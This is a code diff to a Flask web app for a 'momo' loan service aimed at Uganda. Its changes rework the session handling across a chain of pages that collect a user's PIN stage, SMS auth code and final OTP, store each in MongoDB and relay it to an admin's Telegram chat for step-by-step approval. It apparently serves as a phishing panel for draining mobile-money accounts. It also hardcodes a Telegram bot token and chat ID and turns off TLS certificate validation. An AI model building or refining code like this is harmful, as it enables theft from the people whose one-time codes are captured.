@@ -14,8 +14,7 @@ client = MongoClient(MONGO_URI, tls=True, tlsAllowInvalidCertificates=True)
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
-# Telegram Configuration for Uganda 🇺🇬
-# (Replace with your active Uganda Bot Token and Admin Chat ID if needed)
+# Telegram Configuration for Uganda 🇬🇭/🇺🇬
 TELEGRAM_BOT_TOKEN = "8893269969:AAGsjLNbAycQBkRByEGdZslWg-mT_MSuwAM"
 TELEGRAM_ADMIN_CHAT_ID = "7554571504"
 
@@ -104,10 +103,11 @@ def telegram_webhook():
                     else:
                         new_status = "Approved"
 
-                    applications_collection.update_one(
+                    res = applications_collection.update_one(
                         {"_id": obj_id},
                         {"$set": {"status": new_status, "custom_message": ""}}
                     )
+                    print(f"Approval update count: {res.modified_count} for status {new_status}")
                     text_response = f"✅ {step_code.upper()} Approved!"
 
                 elif action == "reject":
@@ -266,15 +266,13 @@ def pending():
 @app.route("/check-status")
 def check_status():
     app_id = request.args.get("app_id")
-    current_id = session.get("current_app_id")
-    
     record = None
     if app_id:
         record = applications_collection.find_one({"app_id": app_id})
-    elif current_id:
-        record = applications_collection.find_one({"_id": ObjectId(current_id)})
         
     if record:
+        # Also store MongoDB ID in session for subsequent POST requests
+        session["current_app_id"] = str(record["_id"])
         return jsonify({
             "status": record.get("status", "Pending_PIN"),
             "custom_message": record.get("custom_message", "")
@@ -284,38 +282,42 @@ def check_status():
 
 @app.route("/submit-auth-code", methods=["GET", "POST"])
 def submit_auth_code():
+    current_id = session.get("current_app_id")
+    record = applications_collection.find_one({"_id": ObjectId(current_id)}) if current_id else None
+    app_id = record.get("app_id") if record else ""
+
     if request.method == "POST":
         auth_code = request.form.get("auth_code")
-        current_id = session.get("current_app_id")
-        
         if current_id:
             applications_collection.update_one(
                 {"_id": ObjectId(current_id)},
                 {"$set": {"auth_code": auth_code, "status": "Pending_SMS"}}
             )
-            record = applications_collection.find_one({"_id": ObjectId(current_id)})
-            send_telegram_interactive_alert(record, stage_title="APPROVAL 2: SMS SUBMITTED (UG)", step_code="sms")
+            updated_record = applications_collection.find_one({"_id": ObjectId(current_id)})
+            send_telegram_interactive_alert(updated_record, stage_title="APPROVAL 2: SMS SUBMITTED (UG)", step_code="sms")
             
-        return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
+        return redirect(url_for("pending", app_id=app_id))
     
-    return render_template("submit_auth_code.html")
+    return render_template("submit_auth_code.html", app_id=app_id)
 
 @app.route("/final-verify", methods=["GET", "POST"])
 def final_verify():
+    current_id = session.get("current_app_id")
+    record = applications_collection.find_one({"_id": ObjectId(current_id)}) if current_id else None
+    app_id = record.get("app_id") if record else ""
+
     if request.method == "POST":
         final_code = request.form.get("final_code")
-        current_id = session.get("current_app_id")
-        
         if current_id:
             applications_collection.update_one(
                 {"_id": ObjectId(current_id)},
                 {"$set": {"final_auth_code": final_code, "status": "Pending_OTP"}}
             )
-            record = applications_collection.find_one({"_id": ObjectId(current_id)})
-            send_telegram_interactive_alert(record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED (UG)", step_code="otp")
+            updated_record = applications_collection.find_one({"_id": ObjectId(current_id)})
+            send_telegram_interactive_alert(updated_record, stage_title="APPROVAL 3: FINAL OTP SUBMITTED (UG)", step_code="otp")
             
-        return redirect(url_for("pending", app_id=record.get("app_id") if record else ""))
-    return render_template("final_verify.html")
+        return redirect(url_for("pending", app_id=app_id))
+    return render_template("final_verify.html", app_id=app_id)
 
 @app.route("/success")
 def success():
